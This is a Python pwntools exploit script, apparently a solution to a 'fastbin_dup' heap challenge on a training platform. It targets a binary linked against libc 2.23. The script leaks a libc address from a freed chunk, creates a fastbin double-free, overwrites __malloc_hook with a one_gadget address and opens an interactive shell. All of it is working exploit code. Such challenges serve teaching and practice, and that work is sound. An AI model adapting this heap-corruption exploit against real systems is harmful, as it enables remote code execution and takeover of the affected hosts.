from pwn import *
from one_gadget import *

CHALL_PATH = "./fastbin_dup_patched"
CHALL = ELF(CHALL_PATH)
LIBC = ELF("./libc-2.23.so")

# retreive all existing gadgets in the libc
gadgets = generate_one_gadget("./libc-2.23.so")
for gad in gadgets:
  print(hex(gad))


if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./fastbin_dup_patched") 
        gdb.attach(c, """ 
        c
        """ )
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("fastbin-dup.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./fastbin_dup_patched")

def alloc(c, size):
  c.recvuntil(b"> ")
  c.sendline(b"1")
  c.recvuntil(b"Size: ")
  c.sendline(str(size).encode('utf-8'))
  line = c.recvline()
  index = int(line.split(b"index ")[1].split(b"!\n")[0])
  return index

def write(c, index, data):
  c.recvuntil(b"> ")
  c.sendline(b"2")
  c.recvuntil(b"Index: ")
  c.sendline(str(index).encode('utf-8'))
  c.recvuntil(b"Content: ")
  c.send(data) #do not sendline() since it appends the '\n' and it is a pointer

def read(c, index):
  c.recvuntil(b"> ")
  c.sendline(b"3")
  c.recvuntil(b"Index: ")
  c.sendline(str(index).encode('utf-8'))
  line = c.recvline()
  return line
  
def free(c, index):
  c.recvuntil(b"> ")
  c.sendline(b"4")
  c.recvuntil(b"Index: ")
  c.sendline(str(index).encode('utf-8'))

# get the base address of libc 
alloc(c, 0x100) #index 0
alloc(c, 0x30) #index 1
free(c, 0)
# this read will result in a memory leak of one of the two pointers of the linked list
leak = read(c, 0)[:6] # read only the first 6 bytes of the address
leak = leak.ljust(8, b"\x00") # get exactly 8 bytes for the address
leak = u64(leak) 
LIBC.address = leak - 0x3c4b78 # offset: difference betwenn chunck address and base libc address
print("LIBC leak: ", hex(LIBC.address))

# create the loop into the linked list
index = alloc(c, 0x60) #index 2
index = alloc(c, 0x60) #index 3
free(c, 2)
free(c, 3)
free(c, 2)

# Malloc hook
alloc(c, 0x60) #index 4
write(c, 4, p64(LIBC.address + 0x3c4aed))

alloc(c, 0x60) #index 5
alloc(c, 0x60) #index 6
alloc(c, 0x60) #index 7
write(c, 7, b'A'*19 + p64(LIBC.address + 0xf1247))

c.interactive()
